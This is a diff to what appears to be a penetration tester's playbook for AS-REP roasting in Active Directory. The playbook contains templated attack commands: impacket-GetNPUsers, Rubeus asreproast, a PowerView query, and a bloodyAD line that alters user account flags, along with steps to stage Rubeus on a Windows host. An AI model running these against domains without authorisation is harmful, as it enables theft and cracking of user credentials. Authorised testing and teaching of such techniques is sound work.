@@ -6,6 +6,7 @@ sudo ntpdate <DCIP>
 - [ ] No password needed: users without Kerberos pre-authentication answer anyone
 
 ## Without a credential
+At the pwn-broker prompt: tool install impacket, tool install netexec and tool install bloodyad.
 The / after the domain means no user of my own.
 impacket-GetNPUsers '<Domain>/' -usersfile users.txt -dc-ip <DCIP> -no-pass -format hashcat -outputfile asrep.txt
 - [ ] doesn't have UF_DONT_REQUIRE_PREAUTH set: the user exists, and is not roastable
@@ -31,10 +32,16 @@ bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' remove uac '<
 - [ ] Pre-authentication back on: the last line run, every time
 
 ## From a Windows shell
-Rubeus.exe from my own tools, into upload/ for serve. It writes John's format unless told otherwise.
+At the pwn-broker prompt:
+tool install rubeus
+serve
+serve files rubeus
+On the Windows host:
+- [ ] Rubeus.exe fetched with the line serve files gives
+It writes John's format unless told otherwise.
 .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt /nowrap
 .\Rubeus.exe asreproast /user:<TargetUser> /format:hashcat /outfile:asrep.txt /nowrap
-With PowerView loaded:
+With PowerView loaded, as in :Pb domain-enum:
 Get-DomainUser -PreauthNotRequired -Properties samaccountname
 
 ## Crack
